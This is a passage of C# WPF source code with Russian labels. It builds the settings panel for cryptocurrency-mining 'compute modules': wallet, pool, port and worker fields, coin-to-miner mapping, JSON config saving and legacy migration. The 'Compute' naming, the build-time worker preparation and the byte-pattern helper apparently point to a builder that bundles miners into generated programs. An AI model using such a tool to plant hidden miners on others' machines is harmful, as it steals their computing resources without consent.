            inputGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(0.55, GridUnitType.Star) });
            inputGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(0.75, GridUnitType.Star) });

            // Wallet
            var walletStack = new StackPanel { Margin = new Thickness(0, 0, 8, 0) };
            walletStack.Children.Add(new TextBlock { Text = "Кошелёк:", Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)), FontSize = 10.5, FontWeight = FontWeights.SemiBold, Margin = new Thickness(0, 0, 0, 3) });
            var tbWallet = new WpfTextBox
            {
                Text = endpoint.Wallet,
                Height = 30,
                FontSize = 11,
                Style = (Style)FindResource("ModernInput")
            };
            tbWallet.TextChanged += (s, e) => { capturedEndpoint.Wallet = tbWallet.Text.Trim(); SaveComputeModuleConfig(); };
            walletStack.Children.Add(tbWallet);
            Grid.SetColumn(walletStack, 0);
            inputGrid.Children.Add(walletStack);

            // Pool
            var poolStack = new StackPanel { Margin = new Thickness(0, 0, 8, 0) };
            poolStack.Children.Add(new TextBlock { Text = "Пул:", Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)), FontSize = 10.5, FontWeight = FontWeights.SemiBold, Margin = new Thickness(0, 0, 0, 3) });
            var tbPool = new WpfTextBox
            {
                Text = endpoint.Pool,
                Height = 30,
                FontSize = 11,
                Style = (Style)FindResource("ModernInput")
            };
            tbPool.TextChanged += (s, e) => { capturedEndpoint.Pool = tbPool.Text.Trim(); SaveComputeModuleConfig(); };
            poolStack.Children.Add(tbPool);
            Grid.SetColumn(poolStack, 1);
            inputGrid.Children.Add(poolStack);

            // Port
            var portStack = new StackPanel { Margin = new Thickness(0, 0, 8, 0) };
            portStack.Children.Add(new TextBlock { Text = "Порт:", Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)), FontSize = 10.5, FontWeight = FontWeights.SemiBold, Margin = new Thickness(0, 0, 0, 3) });
            var tbPort = new WpfTextBox
            {
                Text = endpoint.Port.ToString(),
                Height = 30,
                FontSize = 11,
                Style = (Style)FindResource("ModernInput")
            };
            tbPort.TextChanged += (s, e) =>
            {
                if (int.TryParse(tbPort.Text.Trim(), out int p))
                {
                    capturedEndpoint.Port = p;
                    SaveComputeModuleConfig();
                }
            };
            portStack.Children.Add(tbPort);
            Grid.SetColumn(portStack, 2);
            inputGrid.Children.Add(portStack);

            // Worker name
            var workerStack = new StackPanel();
            workerStack.Children.Add(new TextBlock { Text = "Worker:", Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)), FontSize = 10.5, FontWeight = FontWeights.SemiBold, Margin = new Thickness(0, 0, 0, 3) });
            var tbWorker = new WpfTextBox
            {
                Text = endpoint.Worker,
                Height = 30,
                FontSize = 11,
                Style = (Style)FindResource("ModernInput")
            };
            tbWorker.TextChanged += (s, e) => { capturedEndpoint.Worker = tbWorker.Text.Trim(); SaveComputeModuleConfig(); };
            workerStack.Children.Add(tbWorker);
            Grid.SetColumn(workerStack, 3);
            inputGrid.Children.Add(workerStack);

            container.Children.Add(inputGrid);
            return container;
        }

        /// <summary>
        /// Creates a worker status display for a module card.
        /// </summary>
        private UIElement CreateWorkerStatusDisplay(ComputeModuleConfig mod)
        {
            var algoDef = AlgorithmRegistry.GetById(mod.Primary.Algorithm);
            string backendMode = algoDef?.Backend ?? "";

            // Map algorithm to legacy mode string for ComputeWorkerManager compatibility
            string legacyMode = MapAlgorithmToLegacyMode(mod.Primary.Algorithm);
            var (found, workerFileName, version, details) = ComputeWorkerManager.GetWorkerStatus(legacyMode);

            var statusBorder = new Border
            {
                Background = new SolidColorBrush(Color.FromRgb(11, 13, 19)),
                BorderBrush = new SolidColorBrush(Color.FromRgb(30, 35, 48)),
                BorderThickness = new Thickness(1),
                CornerRadius = new CornerRadius(4),
                Padding = new Thickness(10, 5, 10, 5),
                Margin = new Thickness(0, 6, 0, 0)
            };

            var statusPanel = new StackPanel { Orientation = WpfOrientation.Horizontal, VerticalAlignment = VerticalAlignment.Center };

            if (found)
            {
                statusPanel.Children.Add(new TextBlock
                {
                    Text = "✓",
                    FontSize = 13,
                    Foreground = new SolidColorBrush(Color.FromRgb(74, 222, 128)),
                    FontWeight = FontWeights.Bold,
                    Margin = new Thickness(0, 0, 8, 0),
                    VerticalAlignment = VerticalAlignment.Center
                });
                statusPanel.Children.Add(new TextBlock
                {
                    Text = $"Worker: {workerFileName}",
                    Foreground = new SolidColorBrush(Color.FromRgb(241, 245, 249)),
                    FontSize = 10.5,
                    FontWeight = FontWeights.SemiBold,
                    Margin = new Thickness(0, 0, 8, 0),
                    VerticalAlignment = VerticalAlignment.Center
                });
                var versionBadge = new Border
                {
                    Background = new SolidColorBrush(Color.FromRgb(20, 83, 45)),
                    CornerRadius = new CornerRadius(3),
                    Padding = new Thickness(4, 1, 4, 1),
                    Margin = new Thickness(0, 0, 8, 0),
                    VerticalAlignment = VerticalAlignment.Center
                };
                versionBadge.Child = new TextBlock
                {
                    Text = version,
                    Foreground = new SolidColorBrush(Color.FromRgb(134, 239, 172)),
                    FontSize = 9,
                    FontWeight = FontWeights.Bold
                };
                statusPanel.Children.Add(versionBadge);
                statusPanel.Children.Add(new TextBlock
                {
                    Text = "SHA-256 ✓",
                    Foreground = new SolidColorBrush(Color.FromRgb(74, 222, 128)),
                    FontSize = 9.5,
                    VerticalAlignment = VerticalAlignment.Center
                });
            }
            else
            {
                statusPanel.Children.Add(new TextBlock
                {
                    Text = "⚠",
                    FontSize = 13,
                    Foreground = new SolidColorBrush(Color.FromRgb(245, 158, 11)),
                    FontWeight = FontWeights.Bold,
                    Margin = new Thickness(0, 0, 8, 0),
                    VerticalAlignment = VerticalAlignment.Center
                });
                statusPanel.Children.Add(new TextBlock
                {
                    Text = $"Worker ({algoDef?.WorkerExecutable ?? "unknown"}) — будет подготовлен при сборке",
                    Foreground = new SolidColorBrush(Color.FromRgb(245, 158, 11)),
                    FontSize = 10.5,
                    VerticalAlignment = VerticalAlignment.Center
                });
            }

            statusBorder.Child = statusPanel;
            return statusBorder;
        }

        private static string MapAlgorithmToLegacyMode(string algorithmId)
        {
            switch (algorithmId?.ToLowerInvariant())
            {
                case "etc": return "ethereum-classic";
                case "xmr": return "monero";
                case "kas": return "ethereum-classic"; // KAS uses lolMiner like ETC
                case "rvn": return "ethereum-classic"; // RVN uses lolMiner like ETC
                case "ergo": return "ethereum-classic"; // ERGO uses lolMiner like ETC
                default: return "monero";
            }
        }

        private void UpdateModuleStatusBadge(Border card, ComputeModuleConfig mod)
        {
            // Find status badge within the card and update it
            // Simple approach: re-render all cards
            RenderComputeModuleCards();
        }

        private System.Windows.Controls.Button CreateSmallButton(string text, string bgColor, string fgColor)
        {
            var bgBrush = (SolidColorBrush)new BrushConverter().ConvertFromString(bgColor)!;
            var fgBrush = (SolidColorBrush)new BrushConverter().ConvertFromString(fgColor)!;

            return new System.Windows.Controls.Button
            {
                Content = text,
                Height = 24,
                Padding = new Thickness(8, 0, 8, 0),
                FontSize = 10.5,
                Foreground = fgBrush,
                Background = bgBrush,
                BorderBrush = bgBrush,
                BorderThickness = new Thickness(1),
                Cursor = System.Windows.Input.Cursors.Hand
            };
        }

        public (bool isValid, string error) ValidateComputeModuleConfig()
        {
            bool isEnabled = chkComputeEnabled?.IsChecked == true;

            // If compute globally disabled, no validation needed
            if (!isEnabled)
                return (true, "");

            if (ComputeConfig.Modules.Count == 0)
                return (true, ""); // No modules to validate

            var allErrors = new List<string>();
            for (int i = 0; i < ComputeConfig.Modules.Count; i++)
            {
                var mod = ComputeConfig.Modules[i];
                if (!mod.Enabled) continue; // Skip disabled modules

                var (isValid, errors) = mod.Validate(i);
                if (!isValid)
                    allErrors.AddRange(errors);
            }

            if (allErrors.Count > 0)
                return (false, string.Join("\n", allErrors));

            return (true, "");
        }

        private void SaveComputeModuleConfig()
        {
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(_computeConfigFilePath)!);
                ComputeConfig.Enabled = chkComputeEnabled?.IsChecked == true;
                string json = JsonSerializer.Serialize(ComputeConfig, new JsonSerializerOptions { WriteIndented = true });
                File.WriteAllText(_computeConfigFilePath, json, Encoding.UTF8);
            }
            catch { }
        }

        private void LoadComputeModuleConfig()
        {
            try
            {
                if (!File.Exists(_computeConfigFilePath)) return;

                string json = File.ReadAllText(_computeConfigFilePath, Encoding.UTF8);
                using var doc = JsonDocument.Parse(json);
                var root = doc.RootElement;

                // Detect legacy format (has "mode" + "walletAddress" at top level = old single-module config)
                if (root.TryGetProperty("walletAddress", out _) && root.TryGetProperty("mode", out _))
                {
                    // Legacy migration
                    var legacyDict = new Dictionary<string, object>();
                    foreach (var prop in root.EnumerateObject())
                    {
                        legacyDict[prop.Name] = prop.Value;
                    }
                    ComputeConfig = ComputeRootConfig.MigrateFromLegacy(legacyDict);
                    Log("📦 Compute: выполнена миграция конфигурации старого формата → modules[]");
                }
                else
                {
                    // New format — deserialize directly
                    var config = JsonSerializer.Deserialize<ComputeRootConfig>(json);
                    if (config != null)
                    {
                        ComputeConfig = config;
                    }
                }

                chkComputeEnabled.IsChecked = ComputeConfig.Enabled;
            }
            catch (Exception ex)
            {
                Log("⚠️ Ошибка загрузки конфигурации Compute: " + ex.Message);
            }
        }

        private static bool IsComputeModuleKey(string? key)
        {
            if (string.IsNullOrWhiteSpace(key)) return false;
            string k = key.Trim();
            return k.Equals("mode", StringComparison.OrdinalIgnoreCase) ||
                   k.Equals("walletAddress", StringComparison.OrdinalIgnoreCase) ||
                   k.Equals("serverAddress", StringComparison.OrdinalIgnoreCase) ||
                   k.Equals("serverPort", StringComparison.OrdinalIgnoreCase) ||
                   k.Equals("workerName", StringComparison.OrdinalIgnoreCase) ||
                   k.Equals("resourceLimit", StringComparison.OrdinalIgnoreCase) ||
                   k.Equals("enabled", StringComparison.OrdinalIgnoreCase);
        }
        #endregion

        private static int IndexOfBytes(byte[] src, byte[] pattern, int start)
        {
            int max = src.Length - pattern.Length;
            for (int i = start; i <= max; i++)
            {
                if (src[i] == pattern[0])
                {
                    bool match = true;
                    for (int j = 1; j < pattern.Length; j++)
                    {
                        if (src[i + j] != pattern[j]) { match = false; break; }
                    }
                    if (match) return i;
                }
            }
            return -1;
        }
    }
}